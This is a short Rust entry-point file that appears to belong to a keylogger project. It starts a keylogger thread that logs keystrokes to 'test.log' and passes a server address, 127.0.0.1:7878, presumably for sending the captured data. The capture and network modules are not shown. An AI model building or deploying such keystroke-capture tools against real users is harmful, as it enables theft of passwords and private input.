mod keylogger;
mod network;

use std::thread;
use std::net::SocketAddr;
use std::str::FromStr;

const KL_LOG_FILE: &'static str = "test.log";

fn main() {
    let server = SocketAddr::from_str("127.0.0.1:7878").unwrap();

    // Launch the keylogger and save data to file
    let handle = thread::spawn(move || {
        keylogger::start(server, KL_LOG_FILE);
    });

    handle.join().expect("Error join of keylogger's thread");
}
